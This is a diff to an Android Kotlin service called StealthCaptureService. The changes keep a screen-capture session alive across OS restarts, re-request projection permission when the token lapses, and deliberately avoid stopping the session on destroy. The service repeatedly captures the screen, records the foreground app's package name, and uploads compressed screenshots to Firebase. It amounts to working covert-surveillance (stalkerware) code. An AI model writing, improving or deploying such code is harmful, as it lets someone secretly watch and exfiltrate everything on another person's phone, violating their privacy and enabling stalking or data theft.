@@ -76,6 +76,8 @@ class StealthCaptureService : Service() {
     private var currentShotCount = 0
     private var wakeLock: PowerManager.WakeLock? = null
     private var captureJob: kotlinx.coroutines.Job? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var imageReader: ImageReader? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -124,6 +126,17 @@ class StealthCaptureService : Service() {
                 stopCaptureAndCleanup()
                 stopSelf()
             }
+            else -> {
+                // Service restarted by OS (START_STICKY with null intent or unknown action)
+                val token = MediaProjectionHelper.getProjectionToken(this)
+                if (token != null) {
+                    Log.d(TAG, "Service restarted by OS (START_STICKY). Resuming capture loop.")
+                    initMediaProjection(token.first, token.second)
+                    startCaptureLoop()
+                } else {
+                    Log.w(TAG, "Service restarted but no projection token found.")
+                }
+            }
         }
         return START_STICKY
     }
@@ -171,25 +184,88 @@ class StealthCaptureService : Service() {
         try {
             if (activeMediaProjection != null) {
                 mediaProjection = activeMediaProjection
+                setupVirtualDisplay()
                 return
             }
+            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
             if (mediaProjection == null) {
-                val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-                mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
-                activeMediaProjection = mediaProjection
-                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
-                    override fun onStop() {
-                        super.onStop()
-                        Log.w(TAG, "MediaProjection session was stopped by OS.")
-                        mediaProjection = null
-                        activeMediaProjection = null
-                    }
-                }, handler)
+                Log.w(TAG, "getMediaProjection returned null. Intent consumed or expired.")
+                MediaProjectionHelper.clearProjectionToken(this)
+                try {
+                    MediaProjectionHelper.requestProjectionPermission(applicationContext)
+                } catch (_: Exception) {}
+                return
             }
+            activeMediaProjection = mediaProjection
+            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
+                override fun onStop() {
+                    super.onStop()
+                    Log.w(TAG, "MediaProjection session was stopped by OS.")
+                    mediaProjection = null
+                    activeMediaProjection = null
+                    releaseVirtualDisplay()
+                    tryReinitializeToken()
+                }
+            }, handler)
+            setupVirtualDisplay()
         } catch (e: Exception) {
             Log.e(TAG, "Failed to initialize MediaProjection: ${e.message}")
             mediaProjection = null
             activeMediaProjection = null
+            MediaProjectionHelper.clearProjectionToken(this)
+            try {
+                MediaProjectionHelper.requestProjectionPermission(applicationContext)
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun setupVirtualDisplay() {
+        try {
+            releaseVirtualDisplay()
+            val proj = activeMediaProjection ?: mediaProjection ?: return
+            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            val metrics = DisplayMetrics()
+            @Suppress("DEPRECATION")
+            windowManager.defaultDisplay.getRealMetrics(metrics)
+            val width = metrics.widthPixels.coerceAtMost(1080)
+            val height = metrics.heightPixels.coerceAtMost(1920)
+            val density = metrics.densityDpi
+
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+            virtualDisplay = proj.createVirtualDisplay(
+                "StealthDisplay",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader?.surface, null, handler
+            )
+            Log.d(TAG, "VirtualDisplay setup successfully (${width}x${height}).")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to setup VirtualDisplay: ${e.message}")
+        }
+    }
+
+    private fun releaseVirtualDisplay() {
+        try {
+            virtualDisplay?.release()
+        } catch (_: Exception) {}
+        virtualDisplay = null
+        try {
+            imageReader?.close()
+        } catch (_: Exception) {}
+        imageReader = null
+    }
+
+    private fun tryReinitializeToken() {
+        serviceScope.launch {
+            delay(3000L)
+            val token = MediaProjectionHelper.getProjectionToken(this@StealthCaptureService)
+            if (token != null) {
+                Log.d(TAG, "Re-initializing MediaProjection from saved token.")
+                withContext(Dispatchers.Main) {
+                    initMediaProjection(token.first, token.second)
+                }
+            }
         }
     }
 
@@ -271,105 +347,87 @@ class StealthCaptureService : Service() {
             return
         }
 
-        var proj = activeMediaProjection ?: mediaProjection
+        val proj = activeMediaProjection ?: mediaProjection
         if (proj == null) {
             val token = MediaProjectionHelper.getProjectionToken(this)
             if (token != null) {
                 initMediaProjection(token.first, token.second)
-                proj = activeMediaProjection ?: mediaProjection
+            } else {
+                Log.w(TAG, "MediaProjection is null during capture attempt.")
+                return
             }
         }
 
-        if (proj == null) {
-            Log.w(TAG, "MediaProjection is null during capture attempt.")
+        if (virtualDisplay == null || imageReader == null) {
+            setupVirtualDisplay()
+        }
+
+        val reader = imageReader
+        if (reader == null) {
+            Log.w(TAG, "ImageReader is null during capture.")
             return
         }
 
-        serviceScope.launch {
+        serviceScope.launch(Dispatchers.IO) {
+            var image: Image? = null
             try {
-                val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
-                val metrics = DisplayMetrics()
-                @Suppress("DEPRECATION")
-                windowManager.defaultDisplay.getRealMetrics(metrics)
-                val width = metrics.widthPixels
-                val height = metrics.heightPixels
-                val density = metrics.densityDpi
+                image = reader.acquireLatestImage()
+                if (image != null) {
+                    val width = image.width
+                    val height = image.height
+                    val planes = image.planes
+                    val buffer: ByteBuffer = planes[0].buffer
+                    val pixelStride = planes[0].pixelStride
+                    val rowStride = planes[0].rowStride
+                    val rowPadding = rowStride - pixelStride * width
 
-                val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
-                var virtualDisplay: VirtualDisplay? = null
-
-                try {
-                    virtualDisplay = proj.createVirtualDisplay(
-                        "StealthDisplay",
-                        width, height, density,
-                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                        imageReader.surface, null, handler
+                    val bitmap = Bitmap.createBitmap(
+                        width + rowPadding / pixelStride,
+                        height,
+                        Bitmap.Config.ARGB_8888
                     )
+                    bitmap.copyPixelsFromBuffer(buffer)
+                    image.close()
+                    image = null
 
-                    // Allow frame rendering briefly
-                    withContext(Dispatchers.IO) {
-                        Thread.sleep(120)
-                    }
-
-                    var image: Image? = null
-                    try {
-                        image = imageReader.acquireLatestImage()
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Error acquiring image: ${e.message}")
-                    }
-
-                    if (image != null) {
-                        val planes = image.planes
-                        val buffer: ByteBuffer = planes[0].buffer
-                        val pixelStride = planes[0].pixelStride
-                        val rowStride = planes[0].rowStride
-                        val rowPadding = rowStride - pixelStride * width
-
-                        val bitmap = Bitmap.createBitmap(
-                            width + rowPadding / pixelStride,
-                            height,
-                            Bitmap.Config.ARGB_8888
-                        )
-                        bitmap.copyPixelsFromBuffer(buffer)
-                        image.close()
-
-                        // Crop padding if necessary
-                        val cleanBitmap = if (rowPadding > 0) {
-                            Bitmap.createBitmap(bitmap, 0, 0, width, height)
-                        } else {
-                            bitmap
-                        }
-
-                        // Scale image to MAX_WIDTH_PX (600px) maintaining aspect ratio
-                        val scaledBitmap = if (cleanBitmap.width > MAX_WIDTH_PX) {
-                            val scaledHeight = (cleanBitmap.height.toFloat() / cleanBitmap.width.toFloat() * MAX_WIDTH_PX).toInt()
-                            Bitmap.createScaledBitmap(cleanBitmap, MAX_WIDTH_PX, scaledHeight, true)
-                        } else {
-                            cleanBitmap
-                        }
-
-                        // Compress to JPEG with 40% quality
-                        val byteArrayOutputStream = ByteArrayOutputStream()
-                        scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, byteArrayOutputStream)
-                        val imageBytes = byteArrayOutputStream.toByteArray()
-
-                        val base64String = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
-                        val sizeBytes = imageBytes.size
-                        val pkgName = getForegroundPackageName()
-                        val timestamp = System.currentTimeMillis()
-
-                        uploadScreenshotToFirebase(pkgName, timestamp, base64String, sizeBytes)
+                    val cleanBitmap = if (rowPadding > 0) {
+                        Bitmap.createBitmap(bitmap, 0, 0, width, height)
                     } else {
-                        Log.w(TAG, "Acquired image was null.")
+                        bitmap
                     }
 
-                } finally {
-                    virtualDisplay?.release()
-                    imageReader.close()
-                }
+                    val scaledBitmap = if (cleanBitmap.width > MAX_WIDTH_PX) {
+                        val scaledHeight = (cleanBitmap.height.toFloat() / cleanBitmap.width.toFloat() * MAX_WIDTH_PX).toInt()
+                        Bitmap.createScaledBitmap(cleanBitmap, MAX_WIDTH_PX, scaledHeight, true)
+                    } else {
+                        cleanBitmap
+                    }
 
+                    val byteArrayOutputStream = ByteArrayOutputStream()
+                    scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, byteArrayOutputStream)
+                    val imageBytes = byteArrayOutputStream.toByteArray()
+
+                    val base64String = Base64.encodeToString(imageBytes, Base64.NO_WRAP)
+                    val sizeBytes = imageBytes.size
+                    val pkgName = getForegroundPackageName()
+                    val timestamp = System.currentTimeMillis()
+
+                    uploadScreenshotToFirebase(pkgName, timestamp, base64String, sizeBytes)
+                } else {
+                    Log.w(TAG, "Acquired image was null, re-setting up virtual display.")
+                    withContext(Dispatchers.Main) {
+                        setupVirtualDisplay()
+                    }
+                }
             } catch (e: Exception) {
                 Log.e(TAG, "Error in captureAndUpload: ${e.message}")
+                withContext(Dispatchers.Main) {
+                    setupVirtualDisplay()
+                }
+            } finally {
+                try {
+                    image?.close()
+                } catch (_: Exception) {}
             }
         }
     }
@@ -420,6 +478,7 @@ class StealthCaptureService : Service() {
         isCapturing = false
         captureJob?.cancel()
         captureJob = null
+        releaseVirtualDisplay()
         try {
             wakeLock?.let { if (it.isHeld) it.release() }
         } catch (_: Exception) {}
@@ -429,9 +488,7 @@ class StealthCaptureService : Service() {
 
     override fun onDestroy() {
         stopCaptureAndCleanup()
-        try {
-            mediaProjection?.stop()
-        } catch (_: Exception) {}
+        // Do NOT call mediaProjection?.stop() here to keep the MediaProjection session persistent across service restarts
         mediaProjection = null
         serviceScope.cancel()
         super.onDestroy()
